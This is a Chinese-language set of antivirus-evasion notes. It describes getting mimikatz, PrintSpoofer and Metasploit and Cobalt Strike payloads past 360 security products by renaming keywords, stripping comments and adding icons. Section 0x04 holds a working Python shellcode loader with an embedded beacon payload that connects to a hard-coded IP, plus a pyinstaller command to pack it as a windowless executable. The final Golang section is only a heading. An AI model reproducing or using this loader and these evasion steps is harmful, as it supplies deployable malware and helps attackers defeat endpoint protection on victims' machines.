# 免杀小技巧

## 0x01 mimikatz免杀过360安全卫士和360安全杀毒

#### 1 编译开始

![image-20210314235003821](https://i.loli.net/2021/03/14/VDPgbNSf2RQ4kqX.png)

![image-20210314235138733](https://i.loli.net/2021/03/14/olaFPBZ1sYwVvK9.png)

![image-20210314235155567](https://i.loli.net/2021/03/14/EjXu3U4f1ZGcmOg.png)

![image-20210314235348127](https://i.loli.net/2021/03/14/yV9wNMLqdvI6AJ5.png)

生成了x64位。

![image-20210314235638839](https://i.loli.net/2021/03/14/VkMrn9jcagTSGPh.png)

#### 2 免杀

##### (1) 关键字替换大法。将其中的所有关键字替换成为我的ID。

![image-20210314235827009](https://i.loli.net/2021/03/14/3sYRAKlp2JGCLaw.png)

![image-20210315000103977](https://i.loli.net/2021/03/15/kbzAv9wnSI48qBr.png)

全部都需要更改

## 0x02 PrintSpoofer 过360

#### 1.编译

![image-20210315001806744](https://i.loli.net/2021/03/15/goXr3ZSY4t7Huma.png)

这样可以去掉哪些奇怪的dll文件。

#### 2. 免杀

所有关键字的修改

注释信息删除

加一个ico图标

![image-20210315002815924](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20210315002815924.png)

## 0x03 MSF用加载器过360

```
if (argc != 3) {
		printf("%s [host] [port]\n", argv[0]);
		exit(1);
	}
```

```
编译
i686-w64-mingw32-gcc main.c -o mm.exe -lws2_32

```

![image-20210315233836996](https://i.loli.net/2021/03/15/sNbOZCPa3BVrxJD.png)

绕过AV

![image-20210315235118316](https://i.loli.net/2021/03/15/ulSCepQD9MHnPiG.png)

![image-20210315235323918](https://i.loli.net/2021/03/15/WNwQHgkX2GS9FZr.png)

![image-20210315235358689](https://i.loli.net/2021/03/15/huMf5tr3zlZnBmk.png)

![image-20210315235439732](https://i.loli.net/2021/03/15/Tl2LQGayoSdMvhr.png)

![image-20210315235754189](https://i.loli.net/2021/03/15/1UJyR2I38C5LQcP.png)

## 0x04 python3 免杀CS 过360

```
import ctypes
# length: 892 bytes
buf = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x36\x6f\x68\x50\x00\x4b\xf6\x3b\x5c\x35\xed\x7d\xe2\xbc\xc2\x10\xd8\xbd\x7e\xc0\xa7\x27\x5e\xac\x82\xe4\xd2\xa8\x75\xa6\xdf\x67\x94\xad\x9e\x9a\xb1\x44\x4f\x18\xfe\x0d\x93\xb5\xfd\x9f\x6f\x4e\xc5\xd4\x29\x4c\x21\x25\x0b\x55\xf6\x64\xfe\x5c\x0d\xdd\x86\x97\x50\xfd\x24\x2f\x43\x2f\x4d\x8c\x9c\xd5\xae\x68\xb1\xf0\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x58\x42\x4c\x57\x50\x37\x3b\x20\x5a\x75\x6e\x65\x57\x50\x37\x29\x0d\x0a\x00\x05\xb1\x73\xbf\x3c\x6c\x1b\x00\xb6\x44\x98\x34\xfa\xf2\x9a\xdb\x12\xeb\x28\xad\x9b\xd0\xad\x6e\x13\x64\x4f\x73\xc9\xe6\x1d\xed\x4e\x64\x9b\x5d\xc9\x63\xc1\xa1\x04\x34\xc1\x38\x4a\x07\x9a\x1d\xe8\xb0\x8f\xb9\x6d\x9f\x42\xa5\xc6\xfa\xbe\xb8\xaa\x1d\x8b\x65\xec\x2e\x7f\x7f\x39\x79\x41\x28\x9c\xf6\x86\x15\x46\x83\xcc\x9d\xbd\xa7\x89\x7c\x48\xf3\x47\xe4\x8b\x09\x3c\xb0\xfc\xba\xc4\x86\x60\x26\xcf\xca\x85\x71\xf9\x17\x6d\x81\xcb\xe9\x92\x1b\x19\x02\x7b\x5a\x0e\x6a\xb9\x65\x46\x88\x9e\xf4\xfb\x40\xe0\x99\x1c\x14\x7a\xcb\x9d\xf4\x0c\xa7\x58\x17\x53\xee\x7d\x06\x11\xa7\x6d\x98\xe7\xf7\xd8\x87\xb6\x53\x56\xfd\xc8\x15\x7f\x7a\xd8\x68\xb7\x0f\x34\xc6\xd8\x69\x03\x2d\x76\x03\x7d\xe8\xd1\xb9\xb4\x11\xbe\xab\x43\x43\xcd\x46\x22\xac\x88\x9a\xe4\x6c\x53\x0c\xed\x58\xec\xc2\x2c\x49\x21\xbe\x9c\x81\x68\xd6\x1e\x0f\x0b\x41\x8a\x97\x50\x15\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x32\x2e\x31\x39\x32\x2e\x31\x34\x32\x2e\x36\x34\x00\x12\x34\x56\x78"
#shellcode加载
def shellCodeLoad(shellcode):
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))

if __name__ == "__main__":
    shellCodeLoad(bytearray(buf))
```

```
pyinstaller -F .\theone.py --noconsole -i换图标
```

## 0x05 Golang加载器 免杀cs

